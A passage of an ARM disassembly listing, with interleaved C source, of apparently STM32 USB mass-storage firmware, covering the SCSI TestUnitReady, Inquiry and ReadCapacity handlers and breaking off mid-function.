 8009b46:	32b0      	adds	r2, #176	; 0xb0
 8009b48:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009b4c:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009b4e:	697b      	ldr	r3, [r7, #20]
 8009b50:	2b00      	cmp	r3, #0
 8009b52:	d102      	bne.n	8009b5a <SCSI_TestUnitReady+0x2a>
  {
    return -1;
 8009b54:	f04f 33ff 	mov.w	r3, #4294967295
 8009b58:	e043      	b.n	8009be2 <SCSI_TestUnitReady+0xb2>
  }

  /* case 9 : Hi > D0 */
  if (hmsc->cbw.dDataLength != 0U)
 8009b5a:	697b      	ldr	r3, [r7, #20]
 8009b5c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b60:	699b      	ldr	r3, [r3, #24]
 8009b62:	2b00      	cmp	r3, #0
 8009b64:	d00b      	beq.n	8009b7e <SCSI_TestUnitReady+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009b66:	697b      	ldr	r3, [r7, #20]
 8009b68:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b6c:	7f59      	ldrb	r1, [r3, #29]
 8009b6e:	2320      	movs	r3, #32
 8009b70:	2205      	movs	r2, #5
 8009b72:	68f8      	ldr	r0, [r7, #12]
 8009b74:	f000 fb86 	bl	800a284 <SCSI_SenseCode>

    return -1;
 8009b78:	f04f 33ff 	mov.w	r3, #4294967295
 8009b7c:	e031      	b.n	8009be2 <SCSI_TestUnitReady+0xb2>
  }

  if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 8009b7e:	697b      	ldr	r3, [r7, #20]
 8009b80:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b84:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009b88:	2b02      	cmp	r3, #2
 8009b8a:	d10b      	bne.n	8009ba4 <SCSI_TestUnitReady+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009b8c:	7af9      	ldrb	r1, [r7, #11]
 8009b8e:	233a      	movs	r3, #58	; 0x3a
 8009b90:	2202      	movs	r2, #2
 8009b92:	68f8      	ldr	r0, [r7, #12]
 8009b94:	f000 fb76 	bl	800a284 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009b98:	697b      	ldr	r3, [r7, #20]
 8009b9a:	2205      	movs	r2, #5
 8009b9c:	721a      	strb	r2, [r3, #8]
    return -1;
 8009b9e:	f04f 33ff 	mov.w	r3, #4294967295
 8009ba2:	e01e      	b.n	8009be2 <SCSI_TestUnitReady+0xb2>
  }

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 8009ba4:	68fb      	ldr	r3, [r7, #12]
 8009ba6:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009baa:	68fa      	ldr	r2, [r7, #12]
 8009bac:	33b0      	adds	r3, #176	; 0xb0
 8009bae:	009b      	lsls	r3, r3, #2
 8009bb0:	4413      	add	r3, r2
 8009bb2:	685b      	ldr	r3, [r3, #4]
 8009bb4:	689b      	ldr	r3, [r3, #8]
 8009bb6:	7afa      	ldrb	r2, [r7, #11]
 8009bb8:	4610      	mov	r0, r2
 8009bba:	4798      	blx	r3
 8009bbc:	4603      	mov	r3, r0
 8009bbe:	2b00      	cmp	r3, #0
 8009bc0:	d00b      	beq.n	8009bda <SCSI_TestUnitReady+0xaa>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009bc2:	7af9      	ldrb	r1, [r7, #11]
 8009bc4:	233a      	movs	r3, #58	; 0x3a
 8009bc6:	2202      	movs	r2, #2
 8009bc8:	68f8      	ldr	r0, [r7, #12]
 8009bca:	f000 fb5b 	bl	800a284 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009bce:	697b      	ldr	r3, [r7, #20]
 8009bd0:	2205      	movs	r2, #5
 8009bd2:	721a      	strb	r2, [r3, #8]

    return -1;
 8009bd4:	f04f 33ff 	mov.w	r3, #4294967295
 8009bd8:	e003      	b.n	8009be2 <SCSI_TestUnitReady+0xb2>
  }
  hmsc->bot_data_length = 0U;
 8009bda:	697b      	ldr	r3, [r7, #20]
 8009bdc:	2200      	movs	r2, #0
 8009bde:	60da      	str	r2, [r3, #12]

  return 0;
 8009be0:	2300      	movs	r3, #0
}
 8009be2:	4618      	mov	r0, r3
 8009be4:	3718      	adds	r7, #24
 8009be6:	46bd      	mov	sp, r7
 8009be8:	bd80      	pop	{r7, pc}
	...

08009bec <SCSI_Inquiry>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Inquiry(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009bec:	b580      	push	{r7, lr}
 8009bee:	b088      	sub	sp, #32
 8009bf0:	af00      	add	r7, sp, #0
 8009bf2:	60f8      	str	r0, [r7, #12]
 8009bf4:	460b      	mov	r3, r1
 8009bf6:	607a      	str	r2, [r7, #4]
 8009bf8:	72fb      	strb	r3, [r7, #11]
  uint8_t *pPage;
  uint16_t len;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009bfa:	68fb      	ldr	r3, [r7, #12]
 8009bfc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009c00:	68fb      	ldr	r3, [r7, #12]
 8009c02:	32b0      	adds	r2, #176	; 0xb0
 8009c04:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009c08:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009c0a:	69bb      	ldr	r3, [r7, #24]
 8009c0c:	2b00      	cmp	r3, #0
 8009c0e:	d102      	bne.n	8009c16 <SCSI_Inquiry+0x2a>
  {
    return -1;
 8009c10:	f04f 33ff 	mov.w	r3, #4294967295
 8009c14:	e062      	b.n	8009cdc <SCSI_Inquiry+0xf0>
  }

  if (hmsc->cbw.dDataLength == 0U)
 8009c16:	69bb      	ldr	r3, [r7, #24]
 8009c18:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009c1c:	699b      	ldr	r3, [r3, #24]
 8009c1e:	2b00      	cmp	r3, #0
 8009c20:	d10b      	bne.n	8009c3a <SCSI_Inquiry+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009c22:	69bb      	ldr	r3, [r7, #24]
 8009c24:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009c28:	7f59      	ldrb	r1, [r3, #29]
 8009c2a:	2320      	movs	r3, #32
 8009c2c:	2205      	movs	r2, #5
 8009c2e:	68f8      	ldr	r0, [r7, #12]
 8009c30:	f000 fb28 	bl	800a284 <SCSI_SenseCode>
    return -1;
 8009c34:	f04f 33ff 	mov.w	r3, #4294967295
 8009c38:	e050      	b.n	8009cdc <SCSI_Inquiry+0xf0>
  }

  if ((params[1] & 0x01U) != 0U) /* Evpd is set */
 8009c3a:	687b      	ldr	r3, [r7, #4]
 8009c3c:	3301      	adds	r3, #1
 8009c3e:	781b      	ldrb	r3, [r3, #0]
 8009c40:	f003 0301 	and.w	r3, r3, #1
 8009c44:	2b00      	cmp	r3, #0
 8009c46:	d021      	beq.n	8009c8c <SCSI_Inquiry+0xa0>
  {
    if (params[2] == 0U) /* Request for Supported Vital Product Data Pages*/
 8009c48:	687b      	ldr	r3, [r7, #4]
 8009c4a:	3302      	adds	r3, #2
 8009c4c:	781b      	ldrb	r3, [r3, #0]
 8009c4e:	2b00      	cmp	r3, #0
 8009c50:	d105      	bne.n	8009c5e <SCSI_Inquiry+0x72>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page00_Inquiry_Data, LENGTH_INQUIRY_PAGE00);
 8009c52:	2206      	movs	r2, #6
 8009c54:	4923      	ldr	r1, [pc, #140]	; (8009ce4 <SCSI_Inquiry+0xf8>)
 8009c56:	69b8      	ldr	r0, [r7, #24]
 8009c58:	f001 f8fa 	bl	800ae50 <SCSI_UpdateBotData>
 8009c5c:	e03d      	b.n	8009cda <SCSI_Inquiry+0xee>
    }
    else if (params[2] == 0x80U) /* Request for VPD page 0x80 Unit Serial Number */
 8009c5e:	687b      	ldr	r3, [r7, #4]
 8009c60:	3302      	adds	r3, #2
 8009c62:	781b      	ldrb	r3, [r3, #0]
 8009c64:	2b80      	cmp	r3, #128	; 0x80
 8009c66:	d105      	bne.n	8009c74 <SCSI_Inquiry+0x88>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page80_Inquiry_Data, LENGTH_INQUIRY_PAGE80);
 8009c68:	2208      	movs	r2, #8
 8009c6a:	491f      	ldr	r1, [pc, #124]	; (8009ce8 <SCSI_Inquiry+0xfc>)
 8009c6c:	69b8      	ldr	r0, [r7, #24]
 8009c6e:	f001 f8ef 	bl	800ae50 <SCSI_UpdateBotData>
 8009c72:	e032      	b.n	8009cda <SCSI_Inquiry+0xee>
    }
    else /* Request Not supported */
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST,
 8009c74:	69bb      	ldr	r3, [r7, #24]
 8009c76:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009c7a:	7f59      	ldrb	r1, [r3, #29]
 8009c7c:	2324      	movs	r3, #36	; 0x24
 8009c7e:	2205      	movs	r2, #5
 8009c80:	68f8      	ldr	r0, [r7, #12]
 8009c82:	f000 faff 	bl	800a284 <SCSI_SenseCode>
                     INVALID_FIELED_IN_COMMAND);

      return -1;
 8009c86:	f04f 33ff 	mov.w	r3, #4294967295
 8009c8a:	e027      	b.n	8009cdc <SCSI_Inquiry+0xf0>
    }
  }
  else
  {

    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009c8c:	68fb      	ldr	r3, [r7, #12]
 8009c8e:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009c92:	68fa      	ldr	r2, [r7, #12]
 8009c94:	33b0      	adds	r3, #176	; 0xb0
 8009c96:	009b      	lsls	r3, r3, #2
 8009c98:	4413      	add	r3, r2
 8009c9a:	685b      	ldr	r3, [r3, #4]
            ->pInquiry[lun * STANDARD_INQUIRY_DATA_LEN];
 8009c9c:	69d9      	ldr	r1, [r3, #28]
 8009c9e:	7afa      	ldrb	r2, [r7, #11]
 8009ca0:	4613      	mov	r3, r2
 8009ca2:	00db      	lsls	r3, r3, #3
 8009ca4:	4413      	add	r3, r2
 8009ca6:	009b      	lsls	r3, r3, #2
    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009ca8:	440b      	add	r3, r1
 8009caa:	617b      	str	r3, [r7, #20]
    len = (uint16_t)pPage[4] + 5U;
 8009cac:	697b      	ldr	r3, [r7, #20]
 8009cae:	3304      	adds	r3, #4
 8009cb0:	781b      	ldrb	r3, [r3, #0]
 8009cb2:	b29b      	uxth	r3, r3
 8009cb4:	3305      	adds	r3, #5
 8009cb6:	83fb      	strh	r3, [r7, #30]

    if (params[4] <= len)
 8009cb8:	687b      	ldr	r3, [r7, #4]
 8009cba:	3304      	adds	r3, #4
 8009cbc:	781b      	ldrb	r3, [r3, #0]
 8009cbe:	b29b      	uxth	r3, r3
 8009cc0:	8bfa      	ldrh	r2, [r7, #30]
 8009cc2:	429a      	cmp	r2, r3
 8009cc4:	d303      	bcc.n	8009cce <SCSI_Inquiry+0xe2>
    {
      len = params[4];
 8009cc6:	687b      	ldr	r3, [r7, #4]
 8009cc8:	3304      	adds	r3, #4
 8009cca:	781b      	ldrb	r3, [r3, #0]
 8009ccc:	83fb      	strh	r3, [r7, #30]
    }

    (void)SCSI_UpdateBotData(hmsc, pPage, len);
 8009cce:	8bfb      	ldrh	r3, [r7, #30]
 8009cd0:	461a      	mov	r2, r3
 8009cd2:	6979      	ldr	r1, [r7, #20]
 8009cd4:	69b8      	ldr	r0, [r7, #24]
 8009cd6:	f001 f8bb 	bl	800ae50 <SCSI_UpdateBotData>
  }

  return 0;
 8009cda:	2300      	movs	r3, #0
}
 8009cdc:	4618      	mov	r0, r3
 8009cde:	3720      	adds	r7, #32
 8009ce0:	46bd      	mov	sp, r7
 8009ce2:	bd80      	pop	{r7, pc}
 8009ce4:	2000010c 	.word	0x2000010c
 8009ce8:	20000114 	.word	0x20000114

08009cec <SCSI_ReadCapacity10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009cec:	b590      	push	{r4, r7, lr}
 8009cee:	b087      	sub	sp, #28
 8009cf0:	af00      	add	r7, sp, #0
 8009cf2:	60f8      	str	r0, [r7, #12]
 8009cf4:	460b      	mov	r3, r1
 8009cf6:	607a      	str	r2, [r7, #4]
 8009cf8:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009cfa:	68fb      	ldr	r3, [r7, #12]
 8009cfc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009d00:	68fb      	ldr	r3, [r7, #12]
 8009d02:	32b0      	adds	r2, #176	; 0xb0
 8009d04:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009d08:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009d0a:	697b      	ldr	r3, [r7, #20]
 8009d0c:	2b00      	cmp	r3, #0
 8009d0e:	d102      	bne.n	8009d16 <SCSI_ReadCapacity10+0x2a>
  {
    return -1;
 8009d10:	f04f 33ff 	mov.w	r3, #4294967295
 8009d14:	e075      	b.n	8009e02 <SCSI_ReadCapacity10+0x116>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009d16:	68fb      	ldr	r3, [r7, #12]
 8009d18:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009d1c:	68fa      	ldr	r2, [r7, #12]
 8009d1e:	33b0      	adds	r3, #176	; 0xb0
 8009d20:	009b      	lsls	r3, r3, #2
 8009d22:	4413      	add	r3, r2
 8009d24:	685b      	ldr	r3, [r3, #4]
 8009d26:	685c      	ldr	r4, [r3, #4]
 8009d28:	697b      	ldr	r3, [r7, #20]
 8009d2a:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009d2e:	3308      	adds	r3, #8
 8009d30:	697a      	ldr	r2, [r7, #20]
 8009d32:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009d36:	3204      	adds	r2, #4
 8009d38:	7af8      	ldrb	r0, [r7, #11]
 8009d3a:	4619      	mov	r1, r3
 8009d3c:	47a0      	blx	r4
 8009d3e:	4603      	mov	r3, r0
 8009d40:	74fb      	strb	r3, [r7, #19]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009d42:	f997 3013 	ldrsb.w	r3, [r7, #19]
 8009d46:	2b00      	cmp	r3, #0
 8009d48:	d106      	bne.n	8009d58 <SCSI_ReadCapacity10+0x6c>
 8009d4a:	697b      	ldr	r3, [r7, #20]
 8009d4c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d50:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009d54:	2b02      	cmp	r3, #2
 8009d56:	d108      	bne.n	8009d6a <SCSI_ReadCapacity10+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009d58:	7af9      	ldrb	r1, [r7, #11]
 8009d5a:	233a      	movs	r3, #58	; 0x3a
 8009d5c:	2202      	movs	r2, #2
 8009d5e:	68f8      	ldr	r0, [r7, #12]
 8009d60:	f000 fa90 	bl	800a284 <SCSI_SenseCode>
    return -1;
 8009d64:	f04f 33ff 	mov.w	r3, #4294967295
 8009d68:	e04b      	b.n	8009e02 <SCSI_ReadCapacity10+0x116>
  }

  hmsc->bot_data[0] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009d6a:	697b      	ldr	r3, [r7, #20]
 8009d6c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d70:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d72:	3b01      	subs	r3, #1
 8009d74:	0e1b      	lsrs	r3, r3, #24
 8009d76:	b2da      	uxtb	r2, r3
 8009d78:	697b      	ldr	r3, [r7, #20]
 8009d7a:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[1] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009d7c:	697b      	ldr	r3, [r7, #20]
 8009d7e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d82:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d84:	3b01      	subs	r3, #1
 8009d86:	0c1b      	lsrs	r3, r3, #16
 8009d88:	b2da      	uxtb	r2, r3
 8009d8a:	697b      	ldr	r3, [r7, #20]
 8009d8c:	745a      	strb	r2, [r3, #17]
  hmsc->bot_data[2] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009d8e:	697b      	ldr	r3, [r7, #20]
 8009d90:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d94:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d96:	3b01      	subs	r3, #1
 8009d98:	0a1b      	lsrs	r3, r3, #8
 8009d9a:	b2da      	uxtb	r2, r3
 8009d9c:	697b      	ldr	r3, [r7, #20]
 8009d9e:	749a      	strb	r2, [r3, #18]
  hmsc->bot_data[3] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009da0:	697b      	ldr	r3, [r7, #20]
 8009da2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009da6:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009da8:	b2db      	uxtb	r3, r3
 8009daa:	3b01      	subs	r3, #1
 8009dac:	b2da      	uxtb	r2, r3
 8009dae:	697b      	ldr	r3, [r7, #20]
 8009db0:	74da      	strb	r2, [r3, #19]

  hmsc->bot_data[4] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009db2:	697b      	ldr	r3, [r7, #20]
 8009db4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009db8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009dbc:	161b      	asrs	r3, r3, #24
 8009dbe:	b2da      	uxtb	r2, r3
 8009dc0:	697b      	ldr	r3, [r7, #20]
 8009dc2:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009dc4:	697b      	ldr	r3, [r7, #20]
 8009dc6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009dca:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009dce:	141b      	asrs	r3, r3, #16
 8009dd0:	b2da      	uxtb	r2, r3
 8009dd2:	697b      	ldr	r3, [r7, #20]
 8009dd4:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009dd6:	697b      	ldr	r3, [r7, #20]
 8009dd8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ddc:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009de0:	0a1b      	lsrs	r3, r3, #8
 8009de2:	b29b      	uxth	r3, r3
 8009de4:	b2da      	uxtb	r2, r3
 8009de6:	697b      	ldr	r3, [r7, #20]
 8009de8:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_size);
 8009dea:	697b      	ldr	r3, [r7, #20]
 8009dec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009df0:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009df4:	b2da      	uxtb	r2, r3
 8009df6:	697b      	ldr	r3, [r7, #20]
 8009df8:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data_length = 8U;
 8009dfa:	697b      	ldr	r3, [r7, #20]
 8009dfc:	2208      	movs	r2, #8
 8009dfe:	60da      	str	r2, [r3, #12]

  return 0;
 8009e00:	2300      	movs	r3, #0

}
 8009e02:	4618      	mov	r0, r3
 8009e04:	371c      	adds	r7, #28
 8009e06:	46bd      	mov	sp, r7
 8009e08:	bd90      	pop	{r4, r7, pc}

08009e0a <SCSI_ReadCapacity16>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity16(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009e0a:	b590      	push	{r4, r7, lr}
 8009e0c:	b089      	sub	sp, #36	; 0x24
 8009e0e:	af00      	add	r7, sp, #0
 8009e10:	60f8      	str	r0, [r7, #12]
 8009e12:	460b      	mov	r3, r1
 8009e14:	607a      	str	r2, [r7, #4]
 8009e16:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint32_t idx;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009e18:	68fb      	ldr	r3, [r7, #12]
 8009e1a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009e1e:	68fb      	ldr	r3, [r7, #12]
 8009e20:	32b0      	adds	r2, #176	; 0xb0
 8009e22:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009e26:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009e28:	69bb      	ldr	r3, [r7, #24]
 8009e2a:	2b00      	cmp	r3, #0
 8009e2c:	d102      	bne.n	8009e34 <SCSI_ReadCapacity16+0x2a>
  {
    return -1;
 8009e2e:	f04f 33ff 	mov.w	r3, #4294967295
 8009e32:	e0ab      	b.n	8009f8c <SCSI_ReadCapacity16+0x182>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009e34:	68fb      	ldr	r3, [r7, #12]
 8009e36:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009e3a:	68fa      	ldr	r2, [r7, #12]
 8009e3c:	33b0      	adds	r3, #176	; 0xb0
 8009e3e:	009b      	lsls	r3, r3, #2
 8009e40:	4413      	add	r3, r2
 8009e42:	685b      	ldr	r3, [r3, #4]
 8009e44:	685c      	ldr	r4, [r3, #4]
 8009e46:	69bb      	ldr	r3, [r7, #24]
 8009e48:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009e4c:	3308      	adds	r3, #8
 8009e4e:	69ba      	ldr	r2, [r7, #24]
 8009e50:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009e54:	3204      	adds	r2, #4
 8009e56:	7af8      	ldrb	r0, [r7, #11]
 8009e58:	4619      	mov	r1, r3
 8009e5a:	47a0      	blx	r4
 8009e5c:	4603      	mov	r3, r0
 8009e5e:	75fb      	strb	r3, [r7, #23]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009e60:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009e64:	2b00      	cmp	r3, #0
 8009e66:	d106      	bne.n	8009e76 <SCSI_ReadCapacity16+0x6c>
 8009e68:	69bb      	ldr	r3, [r7, #24]
 8009e6a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e6e:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009e72:	2b02      	cmp	r3, #2
 8009e74:	d108      	bne.n	8009e88 <SCSI_ReadCapacity16+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009e76:	7af9      	ldrb	r1, [r7, #11]
 8009e78:	233a      	movs	r3, #58	; 0x3a
 8009e7a:	2202      	movs	r2, #2
 8009e7c:	68f8      	ldr	r0, [r7, #12]
 8009e7e:	f000 fa01 	bl	800a284 <SCSI_SenseCode>
    return -1;
 8009e82:	f04f 33ff 	mov.w	r3, #4294967295
 8009e86:	e081      	b.n	8009f8c <SCSI_ReadCapacity16+0x182>
  }

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e88:	687b      	ldr	r3, [r7, #4]
 8009e8a:	330a      	adds	r3, #10
 8009e8c:	781b      	ldrb	r3, [r3, #0]
 8009e8e:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009e90:	687b      	ldr	r3, [r7, #4]
 8009e92:	330b      	adds	r3, #11
 8009e94:	781b      	ldrb	r3, [r3, #0]
 8009e96:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e98:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009e9a:	687b      	ldr	r3, [r7, #4]
 8009e9c:	330c      	adds	r3, #12
 8009e9e:	781b      	ldrb	r3, [r3, #0]
 8009ea0:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 8009ea2:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 8009ea4:	687a      	ldr	r2, [r7, #4]
 8009ea6:	320d      	adds	r2, #13
 8009ea8:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 8009eaa:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009eac:	69bb      	ldr	r3, [r7, #24]
 8009eae:	60da      	str	r2, [r3, #12]

  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 8009eb0:	2300      	movs	r3, #0
 8009eb2:	61fb      	str	r3, [r7, #28]
 8009eb4:	e008      	b.n	8009ec8 <SCSI_ReadCapacity16+0xbe>
  {
    hmsc->bot_data[idx] = 0U;
 8009eb6:	69ba      	ldr	r2, [r7, #24]
 8009eb8:	69fb      	ldr	r3, [r7, #28]
 8009eba:	4413      	add	r3, r2
 8009ebc:	3310      	adds	r3, #16
 8009ebe:	2200      	movs	r2, #0
 8009ec0:	701a      	strb	r2, [r3, #0]
  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 8009ec2:	69fb      	ldr	r3, [r7, #28]
 8009ec4:	3301      	adds	r3, #1
 8009ec6:	61fb      	str	r3, [r7, #28]
 8009ec8:	69bb      	ldr	r3, [r7, #24]
 8009eca:	68db      	ldr	r3, [r3, #12]
 8009ecc:	69fa      	ldr	r2, [r7, #28]
 8009ece:	429a      	cmp	r2, r3
 8009ed0:	d3f1      	bcc.n	8009eb6 <SCSI_ReadCapacity16+0xac>
  }

  hmsc->bot_data[4] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009ed2:	69bb      	ldr	r3, [r7, #24]
 8009ed4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ed8:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009eda:	3b01      	subs	r3, #1
 8009edc:	0e1b      	lsrs	r3, r3, #24
 8009ede:	b2da      	uxtb	r2, r3
 8009ee0:	69bb      	ldr	r3, [r7, #24]
 8009ee2:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009ee4:	69bb      	ldr	r3, [r7, #24]
 8009ee6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009eea:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009eec:	3b01      	subs	r3, #1
 8009eee:	0c1b      	lsrs	r3, r3, #16
 8009ef0:	b2da      	uxtb	r2, r3
 8009ef2:	69bb      	ldr	r3, [r7, #24]
 8009ef4:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009ef6:	69bb      	ldr	r3, [r7, #24]
 8009ef8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009efc:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009efe:	3b01      	subs	r3, #1
 8009f00:	0a1b      	lsrs	r3, r3, #8
 8009f02:	b2da      	uxtb	r2, r3
 8009f04:	69bb      	ldr	r3, [r7, #24]
 8009f06:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009f08:	69bb      	ldr	r3, [r7, #24]
 8009f0a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f0e:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009f10:	b2db      	uxtb	r3, r3
 8009f12:	3b01      	subs	r3, #1
 8009f14:	b2da      	uxtb	r2, r3
 8009f16:	69bb      	ldr	r3, [r7, #24]
 8009f18:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009f1a:	69bb      	ldr	r3, [r7, #24]
 8009f1c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f20:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f24:	161b      	asrs	r3, r3, #24
 8009f26:	b2da      	uxtb	r2, r3
 8009f28:	69bb      	ldr	r3, [r7, #24]
 8009f2a:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(hmsc->scsi_blk_size >>  16);
